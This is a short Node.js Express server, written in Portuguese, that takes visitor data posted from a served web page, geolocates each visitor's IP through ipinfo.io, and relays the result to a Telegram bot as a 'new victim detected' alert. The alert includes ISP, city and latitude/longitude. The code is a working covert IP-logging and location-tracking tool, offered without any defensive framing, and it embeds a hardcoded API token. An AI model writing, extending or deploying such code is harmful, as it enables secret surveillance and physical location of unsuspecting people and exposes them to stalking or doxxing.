const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/log', async (req, res) => {
  const data = req.body;

  const ipInfo = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`)
    .then(res => res.json());

  const mensagem = `
📡 NOVA VÍTIMA DETECTADA

🧠 ID: ${data.visitorId}
🌍 IP: ${data.ip}
📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
🏢 ISP: ${ipInfo.org}
🕵️‍♂️ Agente: ${data.userAgent}
📱 Dispositivo: ${data.device}
🔗 Lat/Long: ${ipInfo.loc}
  `;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: mensagem
    })
  });

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`🦅 Servidor Falcão rodando: http://localhost:${PORT}`);
});
